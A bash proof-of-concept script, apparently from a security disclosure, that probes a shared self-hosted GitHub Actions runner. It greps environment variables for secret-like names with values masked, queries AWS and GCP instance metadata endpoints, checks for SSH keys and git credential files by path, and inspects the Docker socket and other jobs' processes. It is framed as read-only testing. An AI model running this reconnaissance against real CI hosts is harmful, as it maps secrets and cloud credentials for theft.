#!/bin/bash
echo "=== PoC #5: Self-Hosted Runner Credential & Secrets Exposure Probe ==="
echo "[*] Simulating: malicious PR script running on shared self-hosted runner"
echo "[*] Read-only reconnaissance only — no destructive/exfil actions performed"
echo ""

echo "[+] Runner identity:"
whoami && hostname && id
echo ""

echo "[+] Runner working directory & workspace leftovers:"
pwd
ls -la "${GITHUB_WORKSPACE:-.}/.." 2>/dev/null | head -10
echo ""

echo "[+] Environment variables containing common secret-like keys:"
env | grep -Ei 'token|secret|key|password|credential' | sed -E 's/=(.{4}).*/=\1***REDACTED***/'
echo ""

echo "[+] GitHub Actions runner temp/cache dirs (checking for leftover artifacts):"
ls -la "${RUNNER_TEMP:-/tmp}" 2>/dev/null | head -10
echo ""

echo "[+] Cloud metadata service reachability (AWS/GCP/Azure IMDS):"
curl -sk --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo "  AWS IMDS reachable" || echo "  AWS IMDS not reachable"
curl -sk --max-time 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>/dev/null && echo "  GCP metadata reachable" || echo "  GCP metadata not reachable"
echo ""

echo "[+] SSH keys / git credentials present on runner host (path existence only):"
for p in ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.git-credentials ~/.netrc; do
  if [ -f "$p" ]; then
    echo "  FOUND (path exists, not reading content): $p"
  fi
done
echo ""

echo "[+] Docker socket / container runtime access:"
ls -la /var/run/docker.sock 2>/dev/null || echo "  (no docker socket)"
echo ""

echo "[+] Other jobs' processes visible on this host (shared-runner cross-job leakage check):"
ps aux 2>/dev/null | grep -v 'ps aux' | head -15
echo ""

echo "=== End PoC #5 ==="
